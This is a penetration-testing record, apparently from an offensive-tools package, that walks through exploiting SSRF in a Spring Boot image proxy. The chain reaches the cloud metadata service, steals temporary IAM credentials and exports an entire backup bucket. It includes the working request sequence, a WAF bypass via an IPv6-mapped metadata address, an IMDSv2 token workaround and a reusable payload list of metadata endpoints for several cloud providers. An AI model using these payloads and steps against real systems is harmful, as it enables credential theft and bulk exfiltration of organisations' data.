# [2026-02] SSRF → Cloud Metadata → AK/SK → Full OSS Data

## Scenario classification
Web penetration testing / cloud security

## Target overview
Through an SSRF vulnerability in a web application, accessed the cloud metadata service, obtained temporary credentials, and finally exported all data in the OSS buckets.

## Complete execution chain

1. Found an SSRF in the image proxy interface
   ```
   GET /api/proxy?url=http://127.0.0.1:8080 → 200 OK (intranet port probe succeeded)
   ```
2. Try accessing the cloud metadata
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
   → returns the metadata directory listing
   ```
3. Get the IAM role name
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
   → ECS-Role-WebApp
   ```
4. Get the temporary credentials
   ```
   GET /api/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ECS-Role-WebApp
   → AccessKeyId, SecretAccessKey, Token
   ```
5. Enumerate OSS buckets with the credentials
   ```bash
   export AWS_ACCESS_KEY_ID=AKIA...
   export AWS_SECRET_ACCESS_KEY=...
   export AWS_SESSION_TOKEN=...
   aws s3 ls  # or aliyun oss ls
   ```
6. Find the sensitive bucket and export the data
   ```bash
   aws s3 sync s3://company-backup ./backup/
   ```

## Pitfall record

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| SSRF to 169.254 blocked by the WAF | IP blacklist | Bypass with the IPv6 address `[::ffff:169.254.169.254]` | 15min |
| Temporary credentials expire after 1 hour | Short STS token lifetime | Write a script that refreshes the token automatically | 10min |
| Metadata v2 requires a token | IMDSv2 protection | PUT to get the token first, then request with the token | 20min |

## Toolchain findings
- Alibaba Cloud and AWS have different metadata paths; try each
- IMDSv2 needs two requests (PUT to get the token → GET with the token)
- Some cloud vendors enable IMDSv2 by default, making SSRF harder

## Key code/commands

```bash
# IMDSv2 bypass (requires the SSRF to support custom methods and headers)
# Step 1: get the token
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2: request with the token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <token>
```

## Reusable patterns/script snippets

```bash
# SSRF cloud metadata quick check payload list
PAYLOADS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/metadata/v1/"
  "http://100.100.100.200/latest/meta-data/"
  "http://metadata.google.internal/computeMetadata/v1/"
)
```

## Improvement suggestions for this package
- routing.md already has SSRF/cloud security routes ✓
- Suggest adding a comparison table of each cloud vendor's metadata paths to pentest-tools/references

## Evolution actions
- [ ] Add the cloud metadata path comparison table to references

## Environment information
- Target: Alibaba Cloud ECS + OSS
- Web framework: Spring Boot 2.7
- SSRF type: full echo (Full SSRF)
